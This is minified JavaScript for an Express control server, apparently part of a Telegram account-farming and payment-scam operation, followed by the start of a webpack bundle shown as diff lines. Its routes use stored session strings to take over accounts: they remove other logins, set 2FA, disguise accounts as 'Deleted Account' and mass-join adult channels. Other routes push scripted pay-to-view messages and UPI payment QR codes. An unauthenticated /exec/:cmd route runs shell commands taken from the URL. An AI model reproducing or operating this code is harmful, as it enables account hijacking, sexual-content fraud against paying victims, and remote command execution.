s=e.params.limit?e.params.limit:30,a=e.params.skip?e.params.skip:20,i=e.query?.k,c=o.getInstance(),l=await c.getActiveChannels(parseInt(s),parseInt(a),[i],[],"channels");let r="joinchannel:";for(const e of l)r=r+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";t.send(r)}));let E=Date.now();C.get("/getdata",(async(e,t,n)=>{O.getinstance(),Date.now()>E&&(E=Date.now()+3e5,Array.from(A.values()).map((async e=>{await y(`${e.url}markasread`)}))),t.setHeader("Content-Type","text/html");let s="<html><head></head><body>";s+=await async function(){const e=await createInitializedObject(),t=await o.getInstance();let n=await t.readStats();for(const t of n){const{count:n,newUser:s,payAmount:a,demoGivenToday:o,demoGiven:i,profile:c,client:l,name:r,secondShow:d}=t;if(l&&e[l.toUpperCase()]){const t=e[l.toUpperCase()];t.totalCount+=n,t.totalPaid+=a>0?1:0,t.totalOldPaid+=a>0&&!s?1:0,t.oldPaidDemo+=o&&!s?1:0,t.totalpendingDemos+=a>25&&!i?1:0,t.oldPendingDemos+=a>25&&!i&&!s?1:0,a>25&&!i&&(t.names=t.names+` ${r} |`),i&&(a>90&&!d||a>150&&d)&&(t.fullShowPPl++,t.fullShowNames=t.fullShowNames+` ${r} |`),s&&(t.totalNew+=1,t.totalNewPaid+=a>0?1:0,t.newPaidDemo+=o?1:0,t.newPendingDemos+=a>25&&!i?1:0)}}const s=Object.entries(e);s.sort(((e,t)=>t[1].totalpendingDemos-e[1].totalpendingDemos));let a="";for(const[e,t]of s)a+=`${e.toUpperCase()} : <b>${t.totalpendingDemos}</b> | ${t.names}<br>`;s.sort(((e,t)=>t[1].fullShowPPl-e[1].fullShowPPl));let i="";for(const[e,t]of s)i+=`${e.toUpperCase()} : <b>${t.fullShowPPl}</b> |${t.fullShowNames}<br>`;return`<div>\n      <div style="display: flex; margin-bottom: 60px">\n        <div style="flex: 1;">${a}</div>\n        <div style="flex: 1; ">${i}</div>\n      </div>\n      <div style="display: flex;">\n        <div style="flex: 1; " >${await q()}</div>\n      </div>\n    </div>`}(),s+="</body></html>",s+='<script>\n              console.log("hii");\n              setInterval(() => {\n                window.location.reload();\n              }, 20000);\n          <\/script>',t.send(s)})),C.get("/getdata2",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getDemostat2`),await h(1e3)}})),C.get("/getAllIps",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];try{console.log(t.clientId);const e=await y(`${t.url}getip`);console.log(e.data)}catch(e){}}})),C.get("/refreshupis",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}refreshupis`)}})),C.get("/getuserdata",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getuserstats`),await h(1e3)}})),C.get("/getuserdata2",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getuserstats2`),await h(1e3)}})),C.get("/restartall",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{Array.from(A.values()).map((async e=>{await y(`${e.deployKey}`)}))})),C.get("/sendtoall",(async(e,t,n)=>{O.getinstance(),console.log("Received sendtoall request"),t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query;let s="";Object.keys(e.query).map((e=>{s+=`${n[e]}/`})),console.log(s);for(const e of A.values()){const t=`${e.url}${s}`;console.log(t),await h(1e3),await y(t)}})),C.get("/usermap",(async(e,t)=>{O.getinstance(),console.log("Received Usermap request"),t.json(Array.from(A.values()))})),C.get("/getbufferclients",(async(e,t)=>{const n=o.getInstance(),s=[];(await n.readBufferClients({})).forEach((e=>{s.push(e.mobile)})),t.json(s)})),C.get("/clients",(async(e,t)=>{O.getinstance(),console.log("Received Client request"),t.json(P)})),C.get("/keepready2",(async(e,t,n)=>{O.getinstance(),console.log("Received keepready2 request"),t.send(`Responding!!\nMsg = ${e.query.msg}`),n()}),(async(e,t)=>{const n=e.query.msg;console.log("Msg2 = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}resptopaid2?msg=${n||"Oye..."}`),await y(`${e.url}getDemostats`)}));const s=o.getInstance();await s.clearStats()})),C.get("/keepready",(async(e,t,n)=>{O.getinstance(),console.log("Received Keepready request");const s=encodeURIComponent("Dont Speak Okay!!\n**I am in Bathroom**\n\nMute yourself!!\n\nI will show you Okay..!!"),a="dns"==e.query.msg.toLowerCase()?s:e.query.msg;Array.from(A.values()).map((async e=>{await y(`${e.url}resptopaid?msg=${a||"Oye..."}`)}));const i=o.getInstance();await i.clearStats(),t.send(`Responding!!\nMsg = ${a}`)})),C.get("/asktopay",(async(e,t,n)=>{O.getinstance(),console.log("Received AsktoPay request"),t.send("Asking Pppl"),n()}),(async(e,t)=>{const n=e.query.msg;console.log("Msg = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}asktopay`)}))}));let T=Date.now();C.get("/calltopaid",(async(e,t,n)=>{O.getinstance(),console.log("Received Call request"),t.send("Asking Pppl"),n()}),(async(e,t)=>{const n=e.query.msg;console.log("Msg = ",n),Date.now()>T&&(T=Date.now()+6e5,Array.from(A.values()).map((async e=>{await y(`${e.url}calltopaid`)})))})),C.get("/markasread",(async(e,t,n)=>{O.getinstance(),console.log("Received MarkasRead Req"),t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query.all;Date.now()>E&&(E=Date.now()+3e5,console.log("proceeding with all = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}markasread?${n?"all=true":""}`)})))})),C.get("/setactiveqr",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query.upi;console.log("upi = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}setactiveqr?upi=${n}`)}))})),C.get("/getUpiId",(async(e,t)=>{O.getinstance();const n=e.query.app?e.query.app:"paytm3",s=o.getInstance(),a=await s.getupi(n);t.send(a)})),C.get("/getAllUpiIds",(async(e,t)=>{O.getinstance(),t.json(S)})),C.post("/getAllUpiIds",(async(e,t,n)=>{const s=e.body;O.getinstance();const a=o.getInstance(),i=await a.updateUpis(s);t.json(i),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];await y(`${n.url}refreshupis`)}})),C.get("/getUserConfig",(async(e,t)=>{const n=e.query;O.getinstance();const s=o.getInstance(),a=await s.getUserConfig(n);t.json(a)})),C.post("/getUserConfig",(async(e,t)=>{const n=e.query,s=e.body;O.getinstance();const a=o.getInstance(),i=await a.updateUserConfig(n,s);await k(),t.json(i)})),C.get("/builds",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getBuilds();console.log(s),t.json(s)})),C.post("/builds",(async(e,t)=>{const n=e.body;O.getinstance();const s=o.getInstance();console.log(n);const a=await s.updateBuilds(n);t.json(a)})),C.get("/getAllUserClients",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getAllUserClients(),a=[];s.map((e=>{a.push(e.clientId)})),t.send(a)})),C.get("/getTgConfig",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getTgConfig();t.json(s)})),C.get("/updateActiveChannels",(async(e,t)=>{O.getinstance();const n=o.getInstance();await n.updateActiveChannels(),t.send("ok")})),C.get("/getCurrentActiveUniqueChannels",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getCurrentActiveUniqueChannels();t.json({length:s.length,data:s})})),C.post("/getTgConfig",(async(e,t,n)=>{const s=e.body;O.getinstance();const a=o.getInstance(),i=await a.updateUpis(s);t.json(i),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];await y(`${n.url}refreshupis`)}})),C.get("/lastpings",(async(e,t,n)=>{O.getinstance();let s="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";const a=Array.from(A.values());for(let e=0;e<a.length;e++){const t=a[e];s+=`${t.clientId}  :  ${Number(((Date.now()-t.lastPingTime)/6e4).toFixed(2))}\n`}s+="</pre></body></html>",t.setHeader("Content-Type","text/html"),t.send(s)})),C.get("/lastpingsjson",(async(e,t,n)=>{O.getinstance();let s="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";for(const e in $)s+=`${e}  :  ${Number(((Date.now()-$[e])/6e4).toFixed(2))}\n`;s+="</pre></body></html>",t.setHeader("Content-Type","text/html"),t.send(s)})),C.get("/exitglitches",(async(e,t,n)=>{t.send("ok"),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];n.url.toLowerCase().includes("glitch")&&await y(`${n.url}exit`)}})),C.get("/exitprimary",(async(e,t,n)=>{t.send("ok"),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];n.clientId.toLowerCase().includes("1")&&await y(`${n.url}exit`)}})),C.get("/exitsecondary",(async(e,t,n)=>{t.send("ok"),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];n.clientId.toLowerCase().includes("2")&&await y(`${n.url}exit`)}})),C.get("/connectclient/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});a?c(a.mobile)?t.send("Client Already existing"):await r(a.mobile,a.session)?t.send("client created"):t.send("client EXPIRED"):t.send("User Does not exist")})),C.get("/joinchannels/:number/:limit/:skip",(async(e,t,n)=>{t.send("joiningChannels"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=e.params.limit?e.params.limit:30,s=e.params.skip?e.params.skip:20,a=e.query?.k,l=o.getInstance(),d=await l.getUser({mobile:t});if(!c(d.mobile))if(await r(d.mobile,d.session,!1)){const e=await i(d.mobile),t=await e.channelInfo(!0),o=["wife","adult","lanj","lesb","paid","randi","bhab","boy","girl"],c=await l.getActiveChannels(parseInt(n),parseInt(s),a?[a]:o,t.ids,"channels");console.log("DbChannelsLen: ",c.length);let r="";for(const e of c)r=r+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";await e.removeOtherAuths(),e.joinChannels(r)}else console.log("Client Does not exist!")}catch(e){console.log("Some Error: ",e)}})),C.get("/set2fa/:number",(async(e,t,n)=>{t.send("Setting 2FA"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.set2fa():console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e.code)}})),C.get("/setpp/:number/:name",(async(e,t,n)=>{t.send("Setting 2FA"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=e.params?.name,s=o.getInstance(),a=await s.getUser({mobile:t});if(!c(a.mobile)){const e=await r(a.mobile,a.session),t=await i(a.mobile);e?(await b.getInstance(n),await h(2e3),await t.updateProfilePic("./dp1.jpg"),await h(1e3),await t.updateProfilePic("./dp2.jpg"),await h(1e3),await t.updateProfilePic("./dp3.jpg"),await h(1e3)):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e.code)}})),C.get("/SetAsBufferClient/:number",(async(e,t,n)=>{t.send("Updating Name"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?(await t.set2fa(),await h(3e4),await t.updateUsername(),await h(5e3),await t.updatePrivacyforDeletedAccount(),await h(5e3),await t.updateProfile("Deleted Account","Deleted Account"),await h(5e3),await t.deleteProfilePhotos(),await h(5e3)):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/updatePrivacy/:number",(async(e,t,n)=>{t.send("Updating Privacy"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.updatePrivacy():console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/UpdateUsername/:number",(async(e,t,n)=>{t.send("Updating Privacy"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=e.query?.username,s=o.getInstance(),a=await s.getUser({mobile:t});if(console.log(a),!c(a.mobile)){const e=await r(a.mobile,a.session),t=await i(a.mobile);e?await t.updateUsername(n):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/UpdatePP/:number",(async(e,t,n)=>{t.send("Updating profile Pic"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.updateProfilePic("./qrcode.jpg"):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/UpdateName/:number",(async(e,t,n)=>{t.send("Updating Name"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.updateProfile("Deleted Account","Deleted Account"):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/deletepp/:number",(async(e,t,n)=>{t.send("Updating Name"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.deleteProfilePhotos():console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/removeAuths/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});if(c(a.mobile))t.send("Client Already existing");else{await r(a.mobile,a.session);const e=await i(a.mobile);e?(await e.removeOtherAuths(),t.send("Auths Removed")):t.send("client EXPIRED")}})),C.get("/exec/:cmd",(async(e,t,n)=>{let s=e.params.cmd;console.log("executing: ",s);try{t.send(console.log(f(s).toString()))}catch(e){console.log(e)}})),C.get("/blockusers/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});if(c(a.mobile))t.send("Client Already existing");else{await r(a.mobile,a.session);const e=await i(a.mobile);e?(await e.blockAllUsers(),t.send("Blocked Users")):t.send("client EXPIRED")}})),C.get("/getAuths/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});if(c(a.mobile))t.send("Client Already existing");else{await r(a.mobile,a.session);const e=await i(a.mobile);e?t.json(await e.getAuths()):t.send("client EXPIRED")}})),C.get("/connectcliens/:limit/:skip",(async(e,t)=>{const n=e.params?.limit,s=e.params?.skip,a=o.getInstance(),i=await a.getUsersFullData(parseInt(n),parseInt(s));let l="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";for(const e of i)c(e.mobile)||(l+=await r(e.mobile,e.session)?`${e.mobile} : true\n\n`:`${e.mobile} : false\n\n`);l+="</pre></body></html>",console.log("data: ",l),t.setHeader("Content-Type","text/html"),t.send(l)})),C.get("/disconnectclients",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{await l()})),C.get("/promoteStats",(async(e,t,n)=>{const s=await async function(){let e="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";return e+=await q(),e+="</pre></body></html>",e}();t.setHeader("Content-Type","text/html"),t.send(s)})),C.get("/getusers/:limit/:skip",(async(e,t,n)=>{const s=parseInt(e.params?.limit?e.params?.limit:10),a=parseInt(e.params?.skip?e.params?.skip:10),i=o.getInstance(),c=await i.getUsers(s,a);t.json(c)})),C.get("/getlastmsgs/:number/:limit",(async(e,t,n)=>{const s=parseInt(e.params?.limit?e.params?.limit:10),a=e.params?.number;console.log(a,s);const o=i(a);if(await o.client.connect(),console.log(o.client.connected),o){const e=await(o?.getLastMsgs(s,a));t.send(e)}else t.send("client is undefined")})),C.get("/getchannels",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getchannels`),await h(1e3)}})),C.get("/restart",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query.userName;O.getinstance().restart(n.toLowerCase())})),C.get("/receiveNumber/:num",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{try{const n=e.query.userName,s=parseInt(e.params.num),a=A.get(n.toLowerCase());a&&await t.get(`${a.url}receiveNumber/${s}`,{timeout:7e3})}catch(e){console.log("Some Error: ",e.code)}})),C.get("/tgclientoff/:num",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{try{const n=e.query.userName,s=e.params.num;console.log(new Date(Date.now()).toLocaleString("en-IN",a),"Req receved from: ",e.query.url," : ",n," - ",s);try{const e=A.get(n.toLowerCase()),a=e?.url;if(a){const o=await t.get(`${a}getprocessid`,{timeout:1e4});o.data.ProcessId===s?(A.set(n.toLowerCase(),{...e,timeStamp:Date.now(),downTime:0,lastPingTime:Date.now()}),function(e,t){const n=D.findIndex((t=>t.userName===e));-1!==n?D[n].processId=t:D.push({userName:e,processId:t})}(n,s)):(console.log(`Actual Process Id from ${a}getprocessid : `,o.data.ProcessId),console.log("Request received from Unknown process"))}}catch(e){console.log("Some Error: ",e)}}catch(e){console.log("Some Error: ",e)}})),C.get("/joinchannel",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{try{const t=e.query.userName;if(t){const e=A.get(t.toLowerCase());e?R(e):console.log(new Date(Date.now()).toLocaleString("en-IN",a),`User ${t} Not exist`)}else for(const e of A.values())try{R(e)}catch(e){console.log("Some Error: ",e.code)}}catch(e){console.log("Some Error: ",e)}})),C.get("/joinchannelBf",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{try{B()}catch(e){console.log("Some Error: ",e.code)}})),C.get("/requestcall",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{try{const n=e.query.userName,s=e.query.chatId,a=A.get(n.toLowerCase());console.log(`Call Request Recived: ${n} | ${s}`),a?setTimeout((async()=>{try{(await t.get(`${a.url}requestcall/${s}`,{timeout:7e3})).data?(console.log(`Call Request Sent: ${n} | ${s}`),setTimeout((async()=>{try{await t.get(`${a.url}requestcall/${s}`,{timeout:7e3}),setTimeout((async()=>{await t.get(`${a.url}sendMessage/${s}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`,{timeout:7e3})}),18e4)}catch(e){console.log(e)}}),12e4)):console.log(`Call Request Sent Not Sucess: ${n} | ${s}`)}catch(e){console.log("Failed",a)}}),18e4):console.log("USer not exist!!")}catch(e){console.log("Some Error: ",e.code)}})),C.listen(8e3,(async()=>{console.log("Example app listening at http://localhost:8000")}));class O{static instance=void 0;constructor(){this.main()}static getinstance(){return O.instance||(console.log("creating instance-------"),O.instance=new O),O.instance}main(){}async restart(e,n){const s=A.get(e);console.log(s,e);const a=s?.url;if(a){A.set(e,{...s,timeStamp:Date.now()});try{try{console.log("Checking Health");const e=await t.get(`${a} checkHealth`,{timeout:1e4});if(200===e.status||201===e.status)if(e.data.status===U||"WAIT"===e.data.status)console.log(e.data.userName,": All good");else{console.log(e.data.userName,": DIAGNOSE - HealthCheck - ",e.data.status),await t.get(`${x()}& text=${e.data.userName.toUpperCase()}: HealthCheckError - ${e.data.status} `);try{const e=await t.get(`${a} tryToConnect / ${n} `,{timeout:1e4});console.log(e.data.userName,": RetryResp - ",e.data.status),await t.get(`${x()}& text=${e.data.userName.toUpperCase()}: RetryResponse - ${e.data.status} `)}catch(e){console.log(a,"CONNECTION RESTART FAILED!!")}}else console.log(a,"is unreachable!!")}catch(e){console.log(a,"is unreachable!!")}}catch(e){console.log(e)}}else console.log("url is undefined")}}async function R(e){try{let t=await y(`${e.url}channelinfo`,{timeout:2e5});if(console.log(t),await y(`${x()}&text=ChannelCount SendTrue - ${e.clientId}: ${t.data.canSendTrueCount}`),t?.data?.canSendTrueCount&&t?.data?.canSendTrueCount<250){await y(`${x()}&text=Started Joining Channels- ${e.clientId}`);const n=["wife","adult","lanj","servic","paid","randi","bhab","boy","girl"],s=o.getInstance(),a=await s.getActiveChannels(100,0,n,t.data?.ids,"activeChannels");for(const t of a)try{console.log(t.username);const n=t?.username?.replace("@","");n&&(y(`${e.url}joinchannel?username=${n}`),await h(2e5))}catch(e){console.log("Some Error: ",e)}}}catch(e){console.log(e)}}async function q(){let e="";const t=o.getInstance(),n=await t.readPromoteStats();for(const t of n)e+=`${t.client.toUpperCase()} : <b>${t.totalCount}</b>${t.totalCount>0?` | ${Number((Date.now()-t.lastUpdatedTimeStamp)/6e4).toFixed(2)}`:""}<br>`;return e}let j=[],M=[];async function L(){const e=await o.getInstance();await l(),await h(2e3);const t=await e.readBufferClients({});if(j=[],M=[],t.length<40)for(let e=0;e<40-t.length;e++)M.push(1);for(const n of t)if(console.log(n),await r(n.mobile,n.session)){const t=await i(n.mobile);if(await t.hasPassword()){const s=await t.channelInfo(!0);await e.insertInBufferClients({mobile:n.mobile,channels:s.ids.length}),console.log(n.mobile," :  ALL Good"),j.push(n.mobile)}else M.push(n.mobile),await e.deleteBufferClient(n);await t.disconnect(),await d(n.mobile),await h(2e3)}else console.log(n.mobile," :  false"),M.push(n.mobile),await e.deleteBufferClient(n),await e.deleteUser(n);console.log(M,j),await async function(){const e=await o.getInstance(),t=await e.getNewBufferClients(j);for(;M.length>0;)try{if(t.hasNext()){const n=await t.next();if(await r(n.mobile,n.session)){const t=await i(n.mobile),s=await t.hasPassword();console.log("hasPassword: ",s),s?(await e.updateUser(n,{twoFA:!0}),await t.disconnect(),await d(n.mobile)):(await t.removeOtherAuths(),await t.set2fa(),console.log("waiting for setting 2FA"),await h(35e3),await t.updateUsername(),await h(5e3),await t.updatePrivacyforDeletedAccount(),await h(5e3),await t.updateProfile("Deleted Account","Deleted Account"),await h(5e3),await t.deleteProfilePhotos(),await h(5e3),console.log("Inserting Document"),await e.insertInBufferClients(n),await t.disconnect(),await d(n.mobile),M.pop())}else await e.deleteUser(n)}else console.log("Cursor Does not have Next")}catch(e){console.error("An error occurred:",e)}setTimeout((()=>{B()}),12e4)}()}async function _(e,n){try{const s=await o.getInstance();let a=e.userName?.replace("@","");if("2"==function(e){const t=e.match(/\d+/g);return t?t.join(""):""}(n.clientId))a=(await s.getUserConfig({clientId:n.clientId.replace("2","1")})).userName;else{const e=n.clientId.replace("1","2"),o=await s.updateUserConfig({clientId:e},{mainAccount:a});if(o&&(console.log(e," -  ",o),console.log(`updated ${e}'s MainAccount with ${a}`),o.repl))try{await t.get(`${o?.repl}/exit`)}catch(e){}}const i=await s.updateUserConfig({clientId:n.clientId},{session:e.session,number:e.number?e.number:`+${e.mobile}`,userName:e.userName?.replace("@",""),mainAccount:a});if(console.log("Updated the Client Successfully",i),await s.deleteBufferClient({mobile:n.phoneNumber}),console.log(n.clientId," -  ",i),i?.repl)try{await t.get(`${i?.repl}/exit`)}catch(e){console.log(e)}await k()}catch(e){console.log(e)}}async function B(){const e=o.getInstance();await l(),await h(2e3);const t=await e.readBufferClients({channels:{$lt:150}},5);for(const n of t)if(await r(n.mobile,n.session,!1)){const t=await i(n.mobile),s=await t.channelInfo(!0),a=["wife","adult","lanj","lesb","paid","randi","bhab","boy","girl"],o=await e.getActiveChannels(150,0,a,s.ids,"channels");console.log("DbChannelsLen: ",o.length);let c="";for(const e of o)c=c+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";t.joinChannels(c)}}})();var a=exports;for(var o in s)a[o]=s[o];s.__esModule&&Object.defineProperty(a,"__esModule",{value:!0})})();
+/******/ (() => { // webpackBootstrap
+/******/ 	var __webpack_modules__ = ({
+
+/***/ "axios":
+/*!************************!*\
+  !*** external "axios" ***!
+  \************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("axios");
+
+/***/ }),
+
+/***/ "body-parser":
+/*!******************************!*\
+  !*** external "body-parser" ***!
+  \******************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("body-parser");
+
+/***/ }),
+
+/***/ "cloudinary":
+/*!*****************************!*\
+  !*** external "cloudinary" ***!
+  \*****************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("cloudinary");
+
+/***/ }),
+
+/***/ "cors":
+/*!***********************!*\
+  !*** external "cors" ***!
+  \***********************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("cors");
+
+/***/ }),
+
+/***/ "dotenv":
+/*!*************************!*\
+  !*** external "dotenv" ***!
+  \*************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("dotenv");
+
+/***/ }),
+
+/***/ "express":
+/*!**************************!*\
+  !*** external "express" ***!
+  \**************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("express");
+
+/***/ }),
+
+/***/ "imap":
+/*!***********************!*\
+  !*** external "imap" ***!
+  \***********************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("imap");
+
+/***/ }),
+
+/***/ "mongodb":
+/*!**************************!*\
+  !*** external "mongodb" ***!
+  \**************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("mongodb");
+
+/***/ }),
+
+/***/ "node-schedule-tz":
+/*!***********************************!*\
+  !*** external "node-schedule-tz" ***!
+  \***********************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("node-schedule-tz");
+
+/***/ }),
+
+/***/ "swagger-jsdoc":
+/*!********************************!*\
+  !*** external "swagger-jsdoc" ***!
+  \********************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("swagger-jsdoc");
+
+/***/ }),
+
+/***/ "swagger-ui-express":
+/*!*************************************!*\
+  !*** external "swagger-ui-express" ***!
+  \*************************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("swagger-ui-express");
+
+/***/ }),
+
+/***/ "telegram":
+/*!***************************!*\
+  !*** external "telegram" ***!
+  \***************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("telegram");
+
+/***/ }),
+
+/***/ "telegram/client/uploads":
+/*!******************************************!*\
+  !*** external "telegram/client/uploads" ***!
+  \******************************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("telegram/client/uploads");
+
+/***/ }),
+
+/***/ "telegram/events/index.js":
+/*!*******************************************!*\
+  !*** external "telegram/events/index.js" ***!
+  \*******************************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("telegram/events/index.js");
+
+/***/ }),
+
+/***/ "telegram/sessions":
+/*!************************************!*\
+  !*** external "telegram/sessions" ***!
+  \************************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("telegram/sessions");
+
+/***/ }),
+
+/***/ "child_process":
+/*!********************************!*\
+  !*** external "child_process" ***!
+  \********************************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("child_process");
+
+/***/ }),
+
+/***/ "fs":
+/*!*********************!*\
+  !*** external "fs" ***!
+  \*********************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("fs");
+
+/***/ }),
+
+/***/ "path":
+/*!***********************!*\
+  !*** external "path" ***!
+  \***********************/
+/***/ ((module) => {
+
+"use strict";
+module.exports = require("path");
+
+/***/ }),
+
+/***/ "./cloudinary.js":
+/*!***********************!*\
+  !*** ./cloudinary.js ***!
+  \***********************/
+/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
+
+console.log("in Cloudinary");
+const cloudinary = __webpack_require__(/*! cloudinary */ "cloudinary");
+const path = __webpack_require__(/*! path */ "path");
+const fs = __webpack_require__(/*! fs */ "fs");
+const { fetchWithTimeout } = __webpack_require__(/*! ./utils */ "./utils.js");
+
+class CloudinaryService {
+    static instance;
+    resources = new Map();
+
+    constructor() {
+        cloudinary.v2.config({
+            cloud_name: process.env.CL_NAME,
+            api_key: process.env.CL_APIKEY,
+            api_secret: process.env.CL_APISECRET
+        });
+    }
+
+    static async getInstance(name) {
+        if (!CloudinaryService.instance) {
+            CloudinaryService.instance = new CloudinaryService();
+        }
+        await CloudinaryService.instance.getResourcesFromFolder(name);
+        return CloudinaryService.instance;
+    }
+
+    async getResourcesFromFolder(folderName) {
+        console.log('FETCHING NEW FILES!! from CLOUDINARY');
+        await this.findAndSaveResources(folderName, 'image');
+    }
+
+    async createNewFolder(folderName) {
+        await this.createFolder(folderName);
+        await this.uploadFilesToFolder(folderName);
+    }
+
+    async overwriteFile() {
+        const cloudinaryFileId = "index_nbzca5.js";
+        const localFilePath = "./src/test.js";
+
+        try {
+
+            const result = await cloudinary.v2.uploader.upload(localFilePath, {
+                resource_type: 'auto',
+                overwrite: true,
+                invalidate: true,
+                public_id: cloudinaryFileId
+            });
+            console.log(result);
+        } catch (error) {
+            console.log(error);
+        }
+
+    }
+
+    async findAndSaveResources(folderName, type) {
+        try {
+            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
+            resources.forEach(async (resource) => {
+                try {
+                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
+                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);
+                } catch (error) {
+                    console.log(resource);
+                    console.log(error)
+                }
+
+            });
+        } catch (error) {
+            console.log(error);
+        }
+    }
+
+    async createFolder(folderName) {
+        try {
+            const result = await cloudinary.v2.api.create_folder(folderName);
+
+            return result;
+        } catch (error) {
+            console.error('Error creating folder:', error);
+            throw error;
+        }
+    }
+
